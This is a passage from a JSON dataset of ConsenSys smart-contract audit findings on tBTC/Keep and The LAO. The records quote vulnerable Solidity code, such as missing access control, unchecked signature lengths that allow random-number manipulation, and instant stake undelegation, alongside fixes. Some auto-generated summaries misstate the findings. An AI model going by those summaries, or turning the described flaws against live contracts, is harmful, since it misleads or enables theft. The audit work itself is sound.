of the transaction is rewarded with a\n \\* tattletale reward which is limited to min(1, 20 / group\\_size) of the\n \\* maximum tattletale reward.\n \\*/\nfunction reportRelayEntryTimeout() public {\n    require(hasEntryTimedOut(), \"Entry did not time out\");\n    groups.reportRelayEntryTimeout(signingRequest.groupIndex, groupSize, minimumStake);\n\n    // We could terminate the last active group. If that's the case,\n    // do not try to execute signing again because there is no group\n    // which can handle it.\n    if (numberOfGroups() > 0) {\n        signRelayEntry(\n            signingRequest.relayRequestId,\n            signingRequest.previousEntry,\n            signingRequest.serviceContract,\n            signingRequest.entryVerificationAndProfitFee,\n            signingRequest.callbackFee\n        );\n    }\n}\n\n```\n#### Recommendation\n\n\nMake sure that `reportRelayEntryTimeout` throws as early as possible if the group was previously terminated (`isGroupTerminated`) to avoid that keep-nodes spend gas on a call that will fail. Depending on the reward for calling out the timeout this might create a front-running opportunity that cannot be resolved.",
      "summary": "\nA bug was reported in the Keep-Core software related to the `reportRelayEntryTimeout` method. This method is used to inform the system when a new relay entry generation operation has timed out. The incentive for calling this method is a reward of 5% of the seized amount, which creates an incentive to call the method but may also lead to a race for front-running this call. The method is called from the keep-node, which is unlikely to adjust the gas price and may always lose the race against a front-running bot.\n\nThe recommendation is to make sure that `reportRelayEntryTimeout` throws as early as possible if the group was previously terminated (`isGroupTerminated`) to avoid that keep-nodes spend gas on a call that will fail. Depending on the reward for calling out the timeout this might create a front-running opportunity that cannot be resolved. It is also recommended to monitor the network for this scenario.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13766",
      "title": "Unpredictable behavior due to front running or general bad timing ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis issue has been addressed with <https://github.com/keep-network/tbtc/issues/493> and the following set of PRs:\n\n\n* <https://github.com/keep-network/tbtc/issues/493>\n* <https://github.com/keep-network/keep-tecdsa/issues/296> - note: `initializeImplementation` should be done in `completeUpgrade` otherwise this could be used as a backdoor.\n\t+ fixed by [keep-network/keep-ecdsa#327](https://github.com/keep-network/keep-ecdsa/pull/327) - fixed: initialization moved to complete upgrade step\n* <https://github.com/keep-network/keep-core/issues/1423> - note: initializeImplementation`should be done in`completeUpgrade` otherwise this could be used as a backdoor.\n\t+ fixed by [keep-network/keep-core#1517](https://github.com/keep-network/keep-core/pull/1517) - fixed: initialization moved to complete upgrade step\n\n\nThe client also provided the following statements:\n\n\n\n> \n> In general, our current stance on frontrunning proofs that lead to rewards is that as long as it doesn’t significantly compromise an incentive on the primary actors of the system, we’re comfortable with having it present. In particular, frontrunnable actions that include rewards in several cases have additional incentives—for tBTC deposit owners, for example, claiming bonds in case of misbehavior; for signers, reclaiming bonds in case of deposit owner absence or other misbehavior. We consider signer reclamation of bonds to be a strong incentive, as bond value is expected to be large enough that there is ongoing expected value to having the bond value liquid rather than bonded.\n> \n> \n> \n\n\n\n> \n> Some of the frontrunning cases (e.g. around beacon signing) did not have this additional incentive, and in those cases we’ve taken up the recommendations in the audit.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nIn a number of cases, administrators of contracts can update or upgrade things in the system without warning. This has the potential to violate a security goal of the system.\n\n\nSpecifically, privileged roles could use front running to make malicious changes just ahead of incoming transactions, or purely accidental negative effects could occur due to unfortunate timing of changes.\n\n\nSome instances of this are more important than others, but in general users of the system should have assurances about the behavior of the action they’re about to take.\n\n\n#### Examples\n\n\n**System Parameters**\n\n\nThe owner of the `TBTCSystem` contract can change system parameters at any time with changes taking effect immediately.\n\n\n* `setSignerFeeDivisor` - stored in the deposit contract when creating a new deposit. emits an event.\n* `setLotSizes` - stored in the deposit contract when creating a new deposit. emits an event.\n* `setCollateralizationThresholds` - stored in the deposit contract when creating a new deposit. emits an event.\n\n\nThis also opens up an opportunity for malicious owner to:\n\n\n* interfere with other participants deposit creation attempts (front-running transactions)\n* craft a series of transactions that allow the owner to set parameters that are more beneficial to them, then create a deposit and reset the parameters to the systems' initial settings.\n\n\n**tbtc/implementation/contracts/system/TBTCSystem.sol:L113-L121**\n\n\n\n```\n/// @notice Set the system signer fee divisor.\n/// @param \\_signerFeeDivisor The signer fee divisor.\nfunction setSignerFeeDivisor(uint256 \\_signerFeeDivisor)\n    external onlyOwner\n{\n    require(\\_signerFeeDivisor > 9, \"Signer fee divisor must be greater than 9, for a signer fee that is <= 10%.\");\n    signerFeeDivisor = \\_signerFeeDivisor;\n    emit SignerFeeDivisorUpdated(\\_signerFeeDivisor);\n}\n\n```\n**Upgradables**\n\n\nThe proxy pattern used in many places throughout the system allows the operator to set a new implementation which takes effect immediately.\n\n\n**keep-core/contracts/solidity/contracts/KeepRandomBeaconService.sol:L67-L80**\n\n\n\n```\n/\\*\\*\n \\* @dev Upgrade current implementation.\n \\* @param \\_implementation Address of the new implementation contract.\n \\*/\nfunction upgradeTo(address \\_implementation)\n    public\n    onlyOwner\n{\n    address currentImplementation = implementation();\n    require(\\_implementation != address(0), \"Implementation address can't be zero.\");\n    require(\\_implementation != currentImplementation, \"Implementation address must be different from the current one.\");\n    setImplementation(\\_implementation);\n    emit Upgraded(\\_implementation);\n}\n\n```\n**keep-tecdsa/solidity/contracts/BondedECDSAKeepVendor.sol:L57-L71**\n\n\n\n```\n/// @notice Upgrades the current vendor implementation.\n/// @param \\_implementation Address of the new vendor implementation contract.\nfunction upgradeTo(address \\_implementation) public onlyOwner {\n    address currentImplementation = implementation();\n    require(\n        \\_implementation != address(0),\n        \"Implementation address can't be zero.\"\n    );\n    require(\n        \\_implementation != currentImplementation,\n        \"Implementation address must be different from the current one.\"\n    );\n    setImplementation(\\_implementation);\n    emit Upgraded(\\_implementation);\n}\n\n```\n**Registry**\n\n\n**keep-tecdsa/solidity/contracts/BondedECDSAKeepVendorImplV1.sol:L43-L50**\n\n\n\n```\nfunction registerFactory(address payable \\_factory) external onlyOperatorContractUpgrader {\n    require(\\_factory != address(0), \"Incorrect factory address\");\n    require(\n        registry.isApprovedOperatorContract(\\_factory),\n        \"Factory contract is not approved\"\n    );\n    keepFactory = \\_factory;\n}\n\n```\n#### Recommendation\n\n\nThe underlying issue is that users of the system can’t be sure what the behavior of a function call will be, and this is because the behavior can change at any time.\n\n\nWe recommend giving the user advance notice of changes with a time lock. For example, make all upgrades require two steps with a mandatory time window between them. The first step merely broadcasts to users that a particular change is coming, and the second step commits that change after a suitable waiting period.",
      "summary": "\nA bug report was filed which stated that administrators of contracts could update or upgrade things in the system without warning. This could lead to the violation of a security goal of the system, as privileged roles could use front running to make malicious changes just ahead of incoming transactions, or purely accidental negative effects could occur due to unfortunate timing of changes. Examples of this were given, such as the owner of the TBTCSystem contract being able to change system parameters at any time with changes taking effect immediately. This opens up an opportunity for malicious owner to interfere with other participants deposit creation attempts or craft a series of transactions that allow the owner to set parameters that are more beneficial to them. Additionally, the proxy pattern used in many places throughout the system allows the operator to set a new implementation which takes effect immediately.\n\nThe client also provided statements which stated that as long as frontrunning proofs that lead to rewards does not significantly compromise an incentive on the primary actors of the system, they are comfortable with having it present. However, in cases where there is no additional incentive, the recommendations in the audit have been taken up.\n\nThe underlying issue is that users of the system can’t be sure what the behavior of a function call will be, and this is because the behavior can change at any time. To address this, a recommendation was made to give the user advance notice of changes with a time lock. This would require two steps with a mandatory time window between them. The first step would merely broadcast to users that a particular change is coming, and the second step would commit that change after a suitable waiting period.\n\nThis issue has been addressed with a set of PRs, with fixes such as initialization being moved to the complete upgrade step.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13765",
      "title": "tbtc - No access control in TBTCSystem.requestNewKeep ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nIssue addressed in [keep-network/tbtc#514](https://github.com/keep-network/tbtc/pull/514). Each call to `requestNewKeep` makes a check that `uint(msg.sender)` is an existing `TBTCDepositToken`. Because these tokens are only minted in `DepositFactory`, `msg.sender` would have to be one of the cloned deposit contracts.\n\n\n#### Description\n\n\n`TBTCSystem.requestNewKeep` is used by each new `Deposit` contract on creation. It calls `BondedECDSAKeepFactory.openKeep`, which sets the `Deposit` contract as the “owner,” a permissioned role within the created keep. `openKeep` also automatically allocates bonds from members registered to the application. The “application” from which member bonds are allocated is the tbtc system itself.\n\n\nBecause `requestNewKeep` has no access controls, anyone can request that a keep be opened with `msg.sender` as the “owner,” and arbitrary signing threshold values:\n\n\n**tbtc/implementation/contracts/system/TBTCSystem.sol:L231-L243**\n\n\n\n```\n/// @notice Request a new keep opening.\n/// @param \\_m Minimum number of honest keep members required to sign.\n/// @param \\_n Number of members in the keep.\n/// @return Address of a new keep.\nfunction requestNewKeep(uint256 \\_m, uint256 \\_n, uint256 \\_bond)\n    external\n    payable\n    returns (address)\n{\n    IBondedECDSAKeepVendor \\_keepVendor = IBondedECDSAKeepVendor(keepVendor);\n    IBondedECDSAKeepFactory \\_keepFactory = IBondedECDSAKeepFactory(\\_keepVendor.selectFactory());\n    return \\_keepFactory.openKeep.value(msg.value)(\\_n, \\_m, msg.sender, \\_bond);\n}\n\n```\nGiven that the owner of a keep is able to seize signer bonds, close the keep, and more, having control of this role could be detrimental to group members.\n\n\n#### Recommendation\n\n\nAdd access control to `requestNewKeep`, so that it can only be called as a part of the `Deposit` creation and initialization process.",
      "summary": "\nA bug was identified in the code of the TBTC System contract, which could allow anyone to request a new Keep with themselves as owner and arbitrary signing threshold values. This could be detrimental to the group members, as the owner of the Keep can seize signer bonds, close the Keep, and more. The issue was addressed in keep-network/tbtc#514 by adding access control to the `requestNewKeep` function so that it can only be called as a part of the `Deposit` creation and initialization process. This ensures that only the `DepositFactory` can call `requestNewKeep` and that the `msg.sender` is an existing `TBTCDepositToken`. This prevents malicious actors from taking control of the owner role of a Keep.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13764",
      "title": "tbtc - the tecdsa keep is never closed, signer bonds are not released ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/tbtc/issues/473,> <https://github.com/keep-network/tbtc/issues/490,> <https://github.com/keep-network/tbtc/pull/534,> and [keep-network/tbtc#520](https://github.com/keep-network/tbtc/pull/520).\n\n\n* failed\\_setup:\n\t+ notifySignerSetupFailure ✅closed by seizing funds with [issue 5.10](#tbtc---funder-loses-payment-to-keep-if-signing-group-is-not-established-in-time)\n\t+ notifyFundingTimeout ✅closed with [keep-network/tbtc#534](https://github.com/keep-network/tbtc/pull/534)\n\t+ provideFundingECDSAFraudProof, ✅slashes stake, distributes signer bonds to funder (push payment -> should be pull or funder may block), closes keep.\n\t+ provideFraudBTCFundingProof ✅ removed with [keep-network/tbtc#534](https://github.com/keep-network/tbtc/pull/534)\n\t+ notifyFraudFundingTimeout ✅ removed with [keep-network/tbtc#534](https://github.com/keep-network/tbtc/pull/534)\n* liquidated:\n\t+ provideSPVFraudProof ✅removed\n\t+ purchaseSignerBondsAtAuction ✅ via startSignerAbortLiquidation, ✅ via startSignerFraudLiquidation (implicitly via seizebonds)\n* redeemed:\n\t+ provideRedemptionProof ✅\n\n\n\n\n#### Description\n\n\nAt the end of the TBTC deposit lifecycle happy path, the deposit is supposed to close the keep in order to release the signer bonds. However, there is no call to `closeKeep` in any of the code-bases under audit.\n\n\n#### Recommendation\n\n\nClose the keep releasing the signer bonds.",
      "summary": "\nThis bug report is about a problem in the TBTC deposit lifecycle. The deposit is supposed to close the keep in order to release the signer bonds, but the code-bases under audit do not have a call to `closeKeep`. To resolve this issue, the keep should be closed, releasing the signer bonds. This was addressed with several Github issues and pull requests, including <https://github.com/keep-network/tbtc/issues/473,> <https://github.com/keep-network/tbtc/issues/490,> <https://github.com/keep-network/tbtc/pull/534,> and [keep-network/tbtc#520](https://github.com/keep-network/tbtc/pull/520). The resolution included closing failed_setup and liquidated issues, as well as providing fraud proofs and removing certain functions. It also included starting signer abort liquidation and signer fraud liquidation, as well as seizing funds and providing redemption proofs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13763",
      "title": "Improper length validation in BLS signature library allows RNG manipulation ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAddressed with [keep-network/keep-core#1523](https://github.com/keep-network/keep-core/pull/1523) by adding input length checks to `g2Decompress`, `g2Unmarshal` and `g1Unmarshal`.\n\n\n#### Description\n\n\n`KeepRandomBeaconOperator.relayEntry(bytes memory _signature)` is used to submit random beacon results:\n\n\n**keep-core/contracts/solidity/contracts/KeepRandomBeaconOperator.sol:L418-L433**\n\n\n\n```\nfunction relayEntry(bytes memory \\_groupSignature) public nonReentrant {\n    require(isEntryInProgress(), \"Entry was submitted\");\n    require(!hasEntryTimedOut(), \"Entry timed out\");\n\n    bytes memory groupPubKey = groups.getGroupPublicKey(signingRequest.groupIndex);\n\n    require(\n        BLS.verify(\n            groupPubKey,\n            signingRequest.previousEntry,\n            \\_groupSignature\n        ),\n        \"Invalid signature\"\n    );\n\n    emit RelayEntrySubmitted();\n\n```\nThe function calls `BLS.verify`, which validates that the submitted signature correctly signs the previous recorded random beacon entry. `BLS.verify` calls `AltBn128.g1Unmarshal(signature)`:\n\n\n**keep-core/contracts/solidity/contracts/cryptography/BLS.sol:L31-L37**\n\n\n\n```\nfunction verify(\n    bytes memory publicKey,\n    bytes memory message,\n    bytes memory signature\n) public view returns (bool) {\n\n    AltBn128.G1Point memory \\_signature = AltBn128.g1Unmarshal(signature);\n\n```\n`AltBn128.g1Unmarshal(signature)` reads directly from memory without making any length checks:\n\n\n**keep-core/contracts/solidity/contracts/cryptography/AltBn128.sol:L214-L228**\n\n\n\n```\n/\\*\\*\n \\* @dev Unmarshals a point on G1 from bytes in an uncompressed form.\n \\*/\nfunction g1Unmarshal(bytes memory m) internal pure returns(G1Point memory) {\n    bytes32 x;\n    bytes32 y;\n\n    /\\* solium-disable-next-line \\*/\n    assembly {\n        x := mload(add(m, 0x20))\n        y := mload(add(m, 0x40))\n    }\n\n    return G1Point(uint256(x), uint256(y));\n}\n\n```\nThere are two potential issues with this:\n\n\n1. `g1Unmarshal` may be reading out-of-bounds of the signature from dirty memory.\n2. `g1Unmarshal` may not be reading all of the signature. If more than 64 bytes are supplied, they are ignored for the purposes of signature validation.\n\n\nThese issues are important because the hash of the signature is the “random number” supplied to user contracts:\n\n\n**keep-core/contracts/solidity/contracts/KeepRandomBeaconOperator.sol:L435-L448**\n\n\n\n```\n// Spend no more than groupSelectionGasEstimate + 40000 gas max\n// This will prevent relayEntry failure in case the service contract is compromised\nsigningRequest.serviceContract.call.gas(groupSelectionGasEstimate.add(40000))(\n    abi.encodeWithSignature(\n        \"entryCreated(uint256,bytes,address)\",\n        signingRequest.relayRequestId,\n        \\_groupSignature,\n        msg.sender\n    )\n);\n\nif (signingRequest.callbackFee > 0) {\n    executeCallback(signingRequest, uint256(keccak256(\\_groupSignature)));\n}\n\n```\nAn attacker can use this behavior to game random number generation by frontrunning a valid signature submission with additional byte padding.\n\n\n#### Recommendation\n\n\nEnsure each function in `BLS.sol` properly validates input lengths for all parameters; the same length validation issue exists in `BLS.verifyBytes`.",
      "summary": "\nA bug was reported in the KeepRandomBeaconOperator.sol contract, which is used to submit random beacon results. The function calls BLS.verify which validates that the submitted signature correctly signs the previous recorded random beacon entry. AltBn128.g1Unmarshal(signature) reads directly from memory without making any length checks and this can be exploited to game random number generation by frontrunning a valid signature submission with additional byte padding. To address this issue, input length checks were added to g2Decompress, g2Unmarshal and g1Unmarshal. It is also recommended that each function in BLS.sol should properly validate input lengths for all parameters.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13762",
      "title": "TokenStaking.recoverStake allows instant stake undelegation ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAddressed with [keep-network/keep-core#1521](https://github.com/keep-network/keep-core/pull/1521) by adding a non-zero check for the undelegation block.\n\n\n#### Description\n\n\n`TokenStaking.recoverStake` is used to recover stake that has been designated to be undelegated. It contains a single check to ensure that the undelegation period has passed:\n\n\n**keep-core/contracts/solidity/contracts/TokenStaking.sol:L182-L187**\n\n\n\n```\nfunction recoverStake(address \\_operator) public {\n    uint256 operatorParams = operators[\\_operator].packedParams;\n    require(\n        block.number > operatorParams.getUndelegationBlock().add(undelegationPeriod),\n        \"Can not recover stake before undelegation period is over.\"\n    );\n\n```\nHowever, if an undelegation period is never set, this will always return true, allowing any operator to instantly undelegate stake at any time.\n\n\n#### Recommendation\n\n\nRequire that the undelegation period is nonzero before allowing an operator to recover stake.",
      "summary": "\nThis bug report concerns the `TokenStaking.recoverStake` function in the keep-network/keep-core repository. This function is used to recover stake that has been designated to be undelegated. The function contains a single check to ensure that the undelegation period has passed. However, if an undelegation period is never set, this will always return true, allowing any operator to instantly undelegate stake at any time. The bug was addressed with keep-network/keep-core#1521 by adding a non-zero check for the undelegation block. This means that undelegation period must be nonzero before allowing an operator to recover stake.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13882",
      "title": "Moloch - bool[6] flags can be changed to a dedicated structure  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe Moloch team decided to leave the `flags` structure as is, and added comments to all the usage of the boolean list values to increase readability and mitigate introduction of bugs due to future updates.\n\n\n#### Description\n\n\nThe Moloch contract uses a structure that includes an array of bools to store a few flags about the proposal:\n\n\n**code/contracts/Moloch.sol:L88**\n\n\n\n```\nbool[6] flags; // [sponsored, processed, didPass, cancelled, whitelist, guildkick]\n\n```\nThis makes reasoning about the correctness of the code a bit complicated because one needs to remember what each item in the flag list stands for. The make the reader’s life simpler a dedicated structure can be created that incorporates all of the required flags.\n\n\n#### Examples\n\n\n\n```\n        bool[6] memory flags; // [sponsored, processed, didPass, cancelled, whitelist, guildkick]\n\n```\n#### Recommendation\n\n\nBased on the provided examples change the `bool[6] flags` to the proposed examples.\n\n\n###### Flags as bool array with enum (proposed)\n\n\nThis second contract implements the `flags` as a defined structure with each **named** element representing a specific flag. This method makes clear which flag is accessed because they are referred to by the name, not by the index.\n\n\nThis third contract has the least amount of changes to the code and uses an enum structure to handle the index.\n\n\n\n```\npragma solidity 0.5.15;\n\ncontract FlagsEnum {\n    struct Proposal {\n        address applicant;\n        uint value;\n        bool[3] flags; // [sponsored, processed, kicked]\n    }\n   \n    enum ProposalFlags {\n        SPONSORED,\n        PROCESSED,\n        KICKED\n    }\n   \n    uint proposalCount;\n   \n    mapping(uint256 => Proposal) public proposals;\n   \n    function addProposal(uint \\_value, bool \\_sponsored, bool \\_processed, bool \\_kicked) public returns (uint) {\n        Proposal memory proposal = Proposal({\n            applicant: msg.sender,\n            value: \\_value,\n            flags: [\\_sponsored, \\_processed, \\_kicked]\n        });\n       \n        proposals[proposalCount] = proposal;\n        proposalCount += 1;\n       \n        return (proposalCount);\n    }\n   \n    function getProposal(uint \\_proposalId) public view returns (address, uint, bool, bool, bool) {\n        return (\n            proposals[\\_proposalId].applicant,\n            proposals[\\_proposalId].value,\n            proposals[\\_proposalId].flags[uint(ProposalFlags.SPONSORED)],\n            proposals[\\_proposalId].flags[uint(ProposalFlags.PROCESSED)],\n            proposals[\\_proposalId].flags[uint(ProposalFlags.KICKED)]\n        );\n    }\n}\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13881",
      "title": "Whitelist proposal duplicate  Won't Fix",
      "impact": "LOW",
      "content": "#### Description\n\n\nEvery time when a whitelist proposal is sponsored, it’s checked that there is no other sponsored whitelist proposal with the same token. This is done in order to avoid proposal duplicates.\n\n\n**code/contracts/Moloch.sol:L277-L281**\n\n\n\n```\n// whitelist proposal\nif (proposal.flags[4]) {\n    require(!tokenWhitelist[address(proposal.tributeToken)], \"cannot already have whitelisted the token\");\n    require(!proposedToWhitelist[address(proposal.tributeToken)], 'already proposed to whitelist');\n    proposedToWhitelist[address(proposal.tributeToken)] = true;\n\n```\nThe issue is that even though you can’t sponsor a duplicate proposal, you can still submit a new proposal with the same token.\n\n\n#### Recommendation\n\n\nCheck that there is currently no sponsored proposal with the same token on proposal submission.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13880",
      "title": "Dilution bound should be a fixed-point number  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\na per-proposal dilution bound was considered for the v1, but kept it global in the interest of code simplicity.\n\n\n#### Description\n\n\nThe dilution bound is designed to mitigate an issue where a proposal is passed, then many users ragequit from the DAO and the remaining members have to pay more than they initially intended to. Because of that, the proposal will be automatically rejected if the total amount of shares becomes `dilutionBound` times less than it was before. The problem is that `dilutionBound` is an integer value and it’s impossible to configure it to decimal values such as 1.2, for example.\n\n\n#### Recommendation\n\n\nMake `dilutionBound` a fixed-point number.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13879",
      "title": "No votes are still valid after the ragequit/ragekick  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nShareholders can vote for the upcoming proposals 2 weeks before they can be executed. If they ragequit or get ragekicked, their votes are still considered valid. And while the LAO does not allow anyone to ragequit before the last proposal with `Yes` vote is processed, it’s still possible to quit the LAO and having active `No` votes on some proposals.\n\n\nIt’s not naturally expected behaviour because by that time a user ragequits, they are not part of the LAO and do not have any voting power. Moreover, there is no incentive not to vote `No` just to fail all the possible proposals, because the user won’t be sharing any consequences of the result of these proposals. And even incentivized to vote `No` for every proposal just as the act of revenge for the ragekick.\n\n\n#### Recommendation\n\n\nThe problem is mitigated by the fact that all rejected proposals can be submitted again and be processed a few weeks after.\n\n\nIt’s possible to remove all the `No` votes from the proposals after user’s ragekick/ragequit.",
      "summary": "\nThis bug report concerns the issue of shareholders in a LAO (Limited Liability Autonomous Organization) being able to vote on proposals 2 weeks before they can be executed, even if they ragequit or get ragekicked. This is not expected behavior, as the user is no longer part of the LAO and should not have any voting power. It also creates a situation where a user may have incentive to vote 'No' on every proposal as an act of revenge for the ragekick.\n\nTo mitigate the issue, it is possible to remove all the 'No' votes from the proposals after the user's ragekick/ragequit. Additionally, all rejected proposals can be submitted again and be processed a few weeks later.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13878",
      "title": "Delegate assignment front-running  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nAny member can front-run another member’s delegateKey assignment.\n\n\nif you try to submit an address as your delegateKey, someone else can try to assign your delegate address tp themselves. While incentive of this action is unclear, it’s possible to block some address from being a delegate forever. `ragekick` and `ragequit` do not free the delegate address and the delegate itself also cannot change the address.\n\n\nThe possible attack could be that a well-known hard-to-replace multisig address is assigned as a delegateKey and someone else take this address to block it. Also, if the malicious member is about to ragequit or be kicked, it’s possible to do this attack without losing anything.\n\n\nThe only way to free the delegate is to make it a member, but then it can never be a delegate after.\n\n\n#### Recommendation\n\n\nMake it possible for a delegateKey to approve delegateKey assignment or cancel the current delegation. And additionally, it may be valuable to clear the delegate address in the `_ragequit` function.\n\n\nCommit-reveal methods can also be used to mitigate this attack.",
      "summary": "\nThis bug report is about a vulnerability which allows members to front-run another member's delegateKey assignment. This means that if someone tries to submit an address as their delegateKey, someone else can try to assign the same address to themselves. This could be used to block certain addresses from ever being assigned as a delegate. The only way to free the delegate is to make it a member, but then it can never be a delegate again.\n\nThe report suggests implementing a system where the delegateKey can approve or cancel the current delegation. Additionally, it is recommended that the delegate address be cleared in the `_ragequit` function. Lastly, the report suggests using commit-reveal methods to mitigate this attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13877",
      "title": "Sponsorship front-running ✓ Fixed in Pull Pattern",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nthis issue no longer exists in the Pull Pattern update with Major severity, as mentioned in the recommendation, the front-running vector is still open but no rationale exist for such a behaviour.\n\n\n#### Description\n\n\nIf proposal submission and sponsorship are done in 2 different transactions, it’s possible to front-run the `sponsorProposal` function by any member. The incentive to do that is to be able to block the proposal afterwards. It’s sometimes possible to block the proposal by getting blacklisted at `depositToken`. In that case, the proposal won’t be accepted and the emergency processing is going to happen next. Currently, if the attacker can become whitelisted again, he might even not lose the deposit tokens. If not, it will block the whole system forever and everyone would have to ragequit (but that’s the part of another issue).\n\n\n#### Recommendation\n\n\nPull pattern for token transfers will solve the issue. Front-running will still be possible but it doesn’t affect anything.",
      "summary": "\nThis bug report is about a vulnerability in a proposal submission and sponsorship system, where an attacker can front-run the `sponsorProposal` function, potentially blocking the proposal and making the system unusable. The recommendation is to implement a Pull Pattern for token transfers, which would solve the issue by making front-running impossible. This update has been applied with Major severity, meaning the issue no longer exists. However, there is still no rationale for such a behaviour.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13876",
      "title": "Summoner can steal funds using bailout ✓ Fixed in Pull Pattern",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\n`bailout` no longer exists in the Pull Pattern update. Note that in case the member loses their private key the funds will be lost.\n\n\n#### Description\n\n\nCurrently, there are 2 major reasons for using the `bailout` function:\n\n\n1. Kick someone out of the LAO. If the shareholders vote for kicking somebody, the kicked user goes to jail at first. If the LAO kicks someone, it’s important not to steal user’s funds, but remove them from profit-sharing as soon as possible. Currently, because the user can potentially block some token transfers, funds can’t be transferred and the user is still having loot and is participation in a profit-sharing. In order to avoid that, `bailout` function was introduced. It allows anyone to transfer kicked user’s funds to the summoner if the user does not call `safeRagequit` (which forces the user to lose some funds). The intention is for the summoner to transfer these funds to the kicked member afterwards.\nThe issue here is that it requires a lot of trust to the summoner on the one hand, and requires more time to kick the member out of the LAO.\n2. “lost private key” problem. If someone’s private key was lost, shareholders can allow summoner to transfer funds from any user whose keys were lost. The problem is that any member’s funds can be stolen by the LAO members and the summoner like that. So every member should keep track of that kind of proposal and is forced to do the ragequit if that proposal passes. That decreases trustlessness because if a user is not tracking the system for some time, the user’s money can possibly be stolen.\n\n\n#### Recommendation\n\n\n1. To solve these issues, these 2 intentions should be split into 2 different mechanisms. By implementing pull pattern for token transfers, kicked member won’t be able to block the `ragekick` and the LAO members would be able to kick anyone much quicker. There is no need to keep the `bailout` for this intention.\n2. If “lost private key” problem should be addressed in the LAO, the time period for the funds recovery should be big because there is no need to do the recovery asap. Recovery can be done without a preliminary kick and can even cover not only the `shares` and `loot`, but also tokens that should be withdrawn (if pull pattern is implemented)",
